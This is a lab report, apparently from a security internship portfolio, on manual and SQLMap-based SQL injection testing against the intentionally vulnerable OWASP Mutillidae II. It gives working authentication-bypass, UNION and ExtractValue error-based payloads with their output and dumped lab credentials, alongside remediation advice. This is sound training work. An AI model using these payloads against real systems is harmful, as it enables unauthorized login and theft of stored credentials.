# Manual and Automated SQL Injection Testing

## 1. Engagement Overview

A hands-on SQL injection assessment was conducted against the OWASP Mutillidae II
application hosted locally at `http://192.168.92.3` on a Host Only Adapter network
interface. The assessment covered both manual injection techniques and automated
testing using SQLMap. Two attack surfaces were targeted: the login page
(`index.php?page=login.php`) accepting POST requests, and the User Lookup page
(`index.php?page=user-info.php`) accepting GET requests with parameters visible in
the URL. Security level was set to 0 (Hosed) throughout the engagement.

---

## 2. Objectives

- Identify SQL injection vulnerable parameters across Mutillidae's login and
  user lookup functionality
- Demonstrate authentication bypass via multiple SQL injection techniques
- Extract database version, current database name, table names, column names,
  and user credentials through manual UNION and error-based injection
- Confirm and extend manual findings using SQLMap for automated enumeration
  and data dumping
- Assess the risk posed by cleartext password storage in the accounts table
- Provide specific remediation steps for each confirmed vulnerability

---

## 3. Scope

**In-Scope:**
- Mutillidae II at `http://192.168.92.3/mutillidae/`
- Login page: `index.php?page=login.php` (POST, `username` and `password` fields)
- User Lookup page: `index.php?page=user-info.php` (GET, `username` and
  `password` parameters)
- Backend database: `nowasp` (MySQL 5.1.41)

**Out-of-Scope:**
- Other Mutillidae vulnerability modules not related to SQL injection
- Any systems outside the local Host Only Adapter network
- Denial-of-service or destructive database operations

**Authorization Statement:**
> This assessment was conducted against Mutillidae II, an intentionally vulnerable
> web application built for security training and education. The application was
> deployed in an isolated local lab environment. No production systems or
> unauthorized networks were accessed at any point. All testing was performed
> for educational purposes under authorized course instruction.

---

## 4. Methodology

### Phase 1: Reconnaissance
Mutillidae II was accessed via Firefox at `http://192.168.92.3`. Available modules
were reviewed and two injection surfaces were selected for testing: the login form
using POST and the User Lookup page using GET. The GET page was preferred for
UNION-based attacks because it renders query output directly in the browser,
unlike the login page which only indicates success or failure.

### Phase 2: Mapping / Spidering
Both target pages were loaded and their form fields noted. The login page exposes
`username` and `password` fields as POST body parameters. The User Lookup page
exposes both fields as GET parameters in the URL, making them directly injectable
without intercepting traffic.

### Phase 3: Vulnerability Identification
Basic payloads were injected manually into both pages to test for SQL error
responses. The application returned database error messages including partial query
structures, confirming unsanitized input reaches the MySQL backend. The number
of columns in the backend query was determined using `ORDER BY` incrementation.
Visible columns were identified using a numeric UNION payload. Error-based
injection was tested using `ExtractValue()` to extract database metadata through
MySQL XPATH error messages.

### Phase 4: Exploitation
Authentication bypass was achieved on the login page. UNION-based injection was
used on the User Lookup page to dump usernames, passwords, database version,
current user, and current database name. Error-based injection was used to extract
the database name, table names, and individual column values one record at a time.
SQLMap was then used to automate the full enumeration of databases, users,
password hashes, tables, columns, and all records in the accounts table.

### Phase 5: Validation
All manual findings were cross-referenced with SQLMap output to confirm accuracy.
SQLMap independently identified the same injection points, confirmed the `nowasp`
database, extracted the same user list, and cracked the same password hashes
automatically. The manual and automated results were consistent throughout.

### Phase 6: Documentation
All payloads, application responses, terminal output, and screenshots were recorded
at each step to support the findings in this report.

---

## 5. Vulnerability Summary

| ID | Vulnerability | Severity | Affected Endpoint |
|----|--------------|----------|-------------------|
| 01 | SQL Injection - Authentication Bypass | Critical | /mutillidae/index.php?page=login.php |
| 02 | SQL Injection - UNION-Based Data Extraction | Critical | index.php?page=user-info.php |
| 03 | SQL Injection - Error-Based Data Extraction | Critical | index.php?page=user-info.php |
| 04 | SQL Injection - Boolean-Based Authentication Bypass | Critical | /mutillidae/index.php?page=login.php |
| 05 | Cleartext Password Storage | Critical | Database: nowasp, Table: accounts |
| 06 | Verbose Database Error Messages | Medium | All injectable endpoints |

---

## 6. Detailed Findings

---

### Finding 01: SQL Injection Authentication Bypass (Login Page)

#### Severity
Critical

#### Affected Endpoint
`/mutillidae/index.php?page=login.php` (POST), `username` field

#### Description
The login form passes the `username` field directly into a SQL `SELECT` query
without parameterization. The initial payload `' OR '1'='1` returned an error but
exposed the partial query structure in the response, confirming unsanitized input
reaches the database. Adjusting the payload to use `#` as the comment terminator
instead of a trailing quote bypassed the authentication check entirely and logged
in as the first user in the database, which was the admin account.

#### Proof of Concept

Mutillidae login page with the username and password fields identified as the
attack surface:



![Mutillidae Login Page - Username and Password Fields](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_01%20Mutillidae%20Login%20Page%20-%20Username%20and%20Password%20Fields.jpg)



Initial payload injected into the username field:
```

' OR '1'='1
```
Application returned an error exposing query structure:



![Login Error Response Revealing SQL Query Structure](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_02%20Login%20Error%20Response%20Revealing%20SQL%20Query%20Structure.jpg)



Adjusted payload that achieved successful admin login:
```
' OR '1'='1' #
```

Application response confirming login as `Admin: admin (g0t r00t?)`:



![Successful Admin Login via SQL Injection Payload](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_03%20Successful%20Admin%20Login%20via%20SQL%20Injection%20Payload.jpg)



The `#` character instructed MySQL to treat the remainder of the developer's
query as a comment, so the password check was never evaluated. Because
admin accounts are typically inserted first in the database, the query returned
the admin record as the first match.

#### Impact
Any unauthenticated user can gain full administrative access to the Mutillidae
application by submitting a single crafted username. No password knowledge is
required. On a production application, this would expose the admin dashboard,
all user data, and any administrative functions to an attacker with no credentials.

#### Remediation
- Replace raw query construction with prepared parameterized statements:
```php
$stmt = $pdo->prepare(
    "SELECT * FROM accounts WHERE username = ? AND password = ?"
);
$stmt->execute([$username, $password]);
```

- Validate that usernames match an expected character set before the query
  is constructed (alphanumeric only, maximum length enforced)
- Suppress all database error output in production responses; log errors
  server-side only

---

### Finding 02: UNION-Based SQL Injection (User Lookup Page)

#### Severity
Critical

#### Affected Endpoint
`/mutillidae/index.php?page=user-info.php` (GET), `username` parameter

#### Description
The User Lookup page passes the `username` GET parameter directly into a SQL
query that returns and renders results in the browser. This page is suited to
UNION-based injection because query output is printed on the response page.
The column count of the backend query was determined by incrementing an
`ORDER BY` clause until an error was returned. Visible columns were identified
by injecting numeric placeholders. This allowed the attacker to extract the
database version, current user, current database name, and then all usernames
and passwords from the accounts table in a single payload.

#### Proof of Concept

Column count determination using `ORDER BY` incrementation:
```
' ORDER BY 7 #   (page loads normally)
' ORDER BY 8 #   (error returned - confirms 7 columns in backend query)
```

Visible column identification payload:
```
' UNION SELECT 1, 2, 3, 4, 5, 6, 7 #
```

Application response confirming columns 2, 3, and 4 are rendered on screen:



![UNION SELECT Numeric Payload - Visible Columns 2, 3, 4 Confirmed](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_04%20UNION%20SELECT%20Numeric%20Payload%20-%20Visible%20Columns%202%2C%203%2C%204%20Confirmed.jpg)



Database version, current user, and current database extracted in a single query:
```
' UNION SELECT 1, version(), user(), database(), 5, 6, 7 #
```

Application response:
```
Username = 5.1.41-3ubuntu12.6-log
Password = mutillidae@localhost
Signature = nowasp
```



![UNION SELECT - version(), user(), database() Output](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_05%20UNION%20SELECT%20-%20version()%2C%20user()%2C%20database()%20Output.jpg)



All usernames and cleartext passwords extracted from the accounts table:

```
' UNION SELECT 1, username, password, 4, 5, 6, 7 FROM accounts #
```



![UNION SELECT - Full Accounts Table Dump Including Cleartext Passwords](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_06%20UNION%20SELECT%20-%20Full%20Accounts%20Table%20Dump%20Including%20Cleartext%20Passwords.jpg)



Credentials visible in output (partial list):
```
admin      / admin
adrian     / somepassword
john       / monkey
jeremy     / password
samurai    / samurai
```

#### Impact
The UNION injection against the User Lookup page returned every username and
password stored in the accounts table across 25 records. Because passwords are
stored in cleartext (see Finding 05), no cracking is required. An attacker obtains
working credentials for every account in one request, enabling immediate access
to any account on the platform.

#### Remediation
- Implement prepared parameterized statements for all database queries as
  described in Finding 01
- Apply column-level output encoding so user-controlled data cannot be
  rendered as raw values in the response
- Enforce a strict allowlist on the `username` parameter, reject any input
  containing SQL metacharacters including single quotes, spaces, UNION,
  SELECT, and comment sequences

---

### Finding 03: Error-Based SQL Injection (Database Enumeration)

#### Severity
Critical

#### Affected Endpoint
`/mutillidae/index.php?page=user-info.php` (GET), `username` parameter

#### Description
The application returns verbose MySQL XPATH error messages that embed the
result of SQL expressions within the error text. By passing subqueries inside
`ExtractValue(1, CONCAT(0x7e, <subquery>))`, data from the database was
extracted one record at a time through the error message content. The MSSQL
syntax payload provided in the exercise (`CONVERT(int,...)`) failed because the
backend is MySQL, not Microsoft SQL Server. Correcting the syntax to use
MySQL's `ExtractValue()` function produced working results immediately.

#### Proof of Concept

Database version extracted via error message:

```
' AND ExtractValue(1, CONCAT(0x7e, @@version)) #
```

Error response containing version:
```
XPATH syntax error: '~5.1.41-3ubuntu12.6-log'
```

Current database name extracted:
```
' AND ExtractValue(1, CONCAT(0x7e, database())) #
```

Error response:
```
XPATH syntax error: '~nowasp'
```

First table name in the nowasp database extracted:
```
' AND ExtractValue(1, CONCAT(0x7e,
  (SELECT table_name FROM information_schema.tables
   WHERE table_schema='nowasp' LIMIT 0,1))) #
```

Error response:
```
XPATH syntax error: '~accounts'
```



![Error-Based Injection - ExtractValue Payloads and Error Responses](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_07%20Error-Based%20Injection%20-%20ExtractValue%20Payloads%20and%20Error%20Responses.jpg)



First username extracted from accounts table:
```
' AND ExtractValue(1, CONCAT(0x7e,
  (SELECT username FROM accounts LIMIT 0,1))) #
```

Error response:
```
XPATH syntax error: '~admin'
```

First password extracted:
```
' AND ExtractValue(1, CONCAT(0x7e,
  (SELECT password FROM accounts LIMIT 0,1))) #
```

Error response:
```
XPATH syntax error: '~admin'
```

#### Impact
Error-based injection works even when the application does not render query
results in the normal page response, making it a reliable fallback technique after
UNION injection. In this case, database name, table structure, and individual
credential values were all extracted through error messages alone. This technique
would work even if the output rendering observed in Finding 02 were removed.

#### Remediation
- Disable all database error output in application responses:
  in PHP, set `display_errors = Off` in `php.ini`
- Log all database errors to a server-side log file accessible only to
  administrators, not to the browser
- Address the root injection vulnerability with parameterized statements as
  detailed in Finding 01, which would prevent error-based injection regardless
  of error visibility settings

---

### Finding 04: Boolean-Based SQL Injection Authentication Bypass

#### Severity
Critical

#### Affected Endpoint
`/mutillidae/index.php?page=login.php` (POST), `username` field

#### Description
The login query evaluates both a username match and a boolean condition in the
WHERE clause. Submitting a bare boolean payload (`' AND 1=1 --`) produced
errors because no valid username was provided, causing the boolean to evaluate
against an empty string. Prepending a known valid username to the payload
(`admin' AND 1=1 #`) caused the query to match the admin record and evaluate
the boolean as true, returning a successful login. This technique confirms that
boolean logic is processed directly within the query without sanitization.

#### Proof of Concept

Bare boolean payload (fails with error):

```
' AND 1=1 --
```

Working boolean payload with known username prepended:
```
admin' AND 1=1 #
```

The backend query constructed by the application:
```sql
SELECT * FROM accounts WHERE username='admin' AND 1=1 #' AND password=''
```

Application response confirming successful admin login via boolean bypass:



![Boolean-Based Bypass - Successful Admin Login Confirmation](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_08%20Boolean-Based%20Bypass%20-%20Successful%20Admin%20Login%20Confirmation.jpg)



The `#` comment discards the password check entirely, and `1=1` always
evaluates to true, so the query returns the admin record unconditionally.

#### Impact
Boolean-based injection provides authentication bypass using any confirmed
valid username. In combination with the user enumeration possible via
Finding 02 and Finding 03, an attacker can bypass login for any account on
the platform, not just admin. This gives targeted access to specific user
accounts rather than only the first account returned by a generic OR payload.

#### Remediation
- Implement parameterized queries as described in Finding 01
- Apply multi-factor authentication on high-privilege accounts so that
  authentication bypass alone is insufficient for a complete compromise
- Rate-limit and log repeated failed login attempts to detect injection attempts
  before a successful bypass is achieved

---

### Finding 05: Cleartext Password Storage

#### Severity
Critical

#### Affected Endpoint
Database: `nowasp`, Table: `accounts`, Column: `password`

#### Description
All user passwords in the accounts table are stored as plaintext strings with no
hashing or salting applied. This was confirmed during the UNION injection in
Finding 02, where passwords such as `admin`, `somepassword`, `monkey`, and
`password` were returned directly alongside their respective usernames. SQLMap
independently confirmed this during the automated dump phase and was able to
display all credentials without any cracking step being needed for the plaintext
values. Where hashes were present for system-level database accounts, SQLMap
cracked them automatically using dictionary-based methods, which indicates the
hashes were weak or unsalted.

#### Proof of Concept

UNION injection payload returning cleartext credentials from accounts table:
```
' UNION SELECT 1, username, password, 4, 5, 6, 7 FROM accounts #
```

Accounts table dump showing all 24 records with plaintext passwords:



![SQLMap Accounts Table Dump - Cleartext Passwords Visible](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_09%20SQLMap%20Accounts%20Table%20Dump%20-%20Cleartext%20Passwords%20Visible.jpg)



Selected records from output:
```
admin      / admin
adrian     / somepassword
john       / monkey
jeremy     / password
samurai    / samurai
```

SQLMap automated password hash cracking output for database-level accounts:



![SQLMap Password Hash Cracking - Multiple Accounts Cracked](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_10%20SQLMap%20Password%20Hash%20Cracking%20-%20Multiple%20Accounts%20Cracked.jpg)



#### Impact
Cleartext passwords mean that any SQL injection vulnerability, regardless of
technique, immediately yields working credentials with no further attack steps.
Users who reuse the same password on other platforms are at risk beyond the
application itself. On a production e-commerce or user-facing platform, this
constitutes a direct breach of user data with regulatory implications.

#### Remediation
- Hash all passwords before storage using bcrypt with a minimum cost factor
  of 12, or Argon2id:
```php
$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
```
- Verify passwords using `password_verify()` during authentication rather
  than comparing stored values directly
- Force a password reset for all existing accounts and re-store the new
  passwords in hashed form
- Never store password hints, partial passwords, or reversible encodings

---

### Finding 06: Verbose Database Error Messages

#### Severity
Medium

#### Affected Endpoint
All injectable endpoints (global)

#### Description
The application returns full MySQL error messages directly in the browser
response when a query fails. These messages include the query file path, line
number, error code, errno, the partial SQL query as constructed by the
application, and in the case of error-based injection, the result of embedded
subqueries within the error text. This behavior directly enabled Finding 03 by
providing a reliable side-channel for data extraction.

#### Proof of Concept

Error message returned in browser response during injection testing:
```
/owaspbwa/mutillidae-git/classes/MySQLHandler.php on line 165:
Error executing query:
connect_errno: 0
errno: 1105
error: XPATH syntax error: '~nowasp'
client_info: 5.1.73
host_info: Localhost via UNIX socket
Query: SELECT * FROM accounts WHERE username='' AND
ExtractValue(1, CONCAT(0x7e, database())) #' AND password='' (0)
```



![Verbose MySQL Error Exposing File Path, Query, and Extracted Data](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_11%20Verbose%20MySQL%20Error%20Exposing%20File%20Path%2C%20Query%2C%20and%20Extracted%20Data.jpg)



The error message discloses the full server file path of the database handler
class, the exact SQL query string, and the extracted data value, all in a single
browser response.

#### Remediation
- Set `display_errors = Off` in the application's `php.ini` configuration
- Replace all error output with a generic user-facing message:
  "An error occurred. Please try again."
- Log full error details to a server-side log file readable only by
  administrators
- Remove all stack trace and file path information from any user-visible
  exception handling code

---

## 7. Attack Chain

![Attack Chain](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/29_11%20Attack%20Chain.png)

---

## 8. Tools Used

- Kali Linux (assessment environment)
- Firefox (Mutillidae application access and manual payload injection)
- SQLMap (automated injection, database enumeration, and data dumping)
- Mutillidae II v2.6.24 (intentionally vulnerable target application)

---

## 9. Challenges Encountered

- **Wrong comment syntax on initial payload:** The payload `' OR '1'='1` without
  a comment terminator returned an error rather than bypassing login. The fix was
  switching from a trailing quote to `#` as the MySQL comment character, which
  discarded the password condition entirely.
- **MSSQL payload used against MySQL:** The error-based payload
  `CONVERT(int, (SELECT @@version))` is MSSQL syntax. It failed immediately
  because the backend runs MySQL. Switching to `ExtractValue(1, CONCAT(0x7e,
  @@version))` resolved this. Identifying the correct database type before selecting
  error-based payloads is a necessary pre-enumeration step.
- **UNION payload column count mismatch:** The standard payload
  `' UNION SELECT NULL--` failed because it supplies only one column against a
  backend query expecting seven. Column count determination with `ORDER BY`
  was required before any UNION payload could succeed.
- **information_schema query returning 654 records:** Querying
  `information_schema.tables` without a `WHERE table_schema='nowasp'` filter
  returned all tables across every database on the server. Adding the schema filter
  reduced output to the 12 relevant tables in the nowasp database.

---

## 10. Key Takeaways

- **Comment terminator selection determines payload success:** The difference
  between `--` and `#` decided whether the authentication bypass worked at all.
  MySQL accepts `#` as a single-line comment while some other databases do not.
  Testing both is a basic step that should happen before abandoning a payload.
- **Database type identification shapes every injection technique:** The MSSQL
  error-based payload failed because the wrong syntax was applied to a MySQL
  target. Error messages in this application returned the database version during
  the initial test, making type identification straightforward. In a production
  environment where errors are suppressed, a different fingerprinting approach
  would be needed first.
- **Cleartext storage multiplies the damage from injection:** SQL injection is
  serious on its own. Cleartext passwords turn it into an immediate, complete
  credential breach requiring no additional steps. Hashing passwords with bcrypt
  or Argon2id does not prevent injection from succeeding, but it forces the attacker
  to crack hashes before credentials are usable, significantly raising the cost of
  the attack.
- **Manual and automated testing serve different purposes:** Manual injection
  exposed the column structure, visible columns, and query logic in a way that
  required understanding the application's behavior at each step. SQLMap then
  confirmed and extended those findings faster and more completely. Starting
  with manual testing built the understanding needed to interpret and trust the
  automated results.
- **ORDER BY is the most reliable column counter:** Unlike trial-and-error UNION
  payloads, incrementing `ORDER BY` produces a clean error at the exact column
  boundary. This method works consistently regardless of what columns the backend
  query selects, and it does not require any data to be visible in the response.

---

## 11. Disclaimer

> This assessment was conducted exclusively against **OWASP Mutillidae II
> v2.6.24**, an intentionally vulnerable web application deployed in an isolated
> local lab environment at `http://192.168.92.3`. Mutillidae is designed for
> security training and education. No production systems, public databases, or
> unauthorized networks were accessed at any point. All credentials extracted during
> this assessment exist solely within the lab environment and were obtained for
> educational demonstration purposes only. All techniques described in this report
> must only be applied against systems for which explicit written authorization has
> been obtained prior to testing.

---
